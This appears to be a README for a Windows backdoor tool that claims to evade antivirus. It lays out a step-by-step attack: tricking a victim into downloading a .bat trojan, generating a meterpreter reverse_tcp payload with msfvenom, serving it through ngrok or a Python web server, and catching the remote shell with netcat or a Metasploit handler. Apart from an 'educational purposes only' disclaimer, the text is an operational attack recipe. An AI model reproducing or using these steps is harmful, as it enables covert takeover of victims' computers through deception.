# Windows 11/10 Evade AV & Backdoor

#### **For educational purposes only!**
#### **Social Engineering is required!**
#### **Requires victim to have Admin Privs**

## Steps to Compromise:

1. **Setup Trojan Horse.** 
2. **Get creative and get victim to download .bat file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
3. **Generate the payload:** <br>
Using meterpreter here, but feel free to play around with it. <br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]
4. **Setup server in files directory:** <br>
ngrok tcp 80 or python3 -m http.server 80
Using ngrok, or python if local
5. **Setup your listener with nc or msfconsole:** <br>
nc -lvnp 9001 <br>
or <br>
msfconsole -q <br>
msf> use multi/handler <br>
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444) <br>
msf exploit(handler) > exploit <br>

# Demonstration Video
Insert video in markdown!
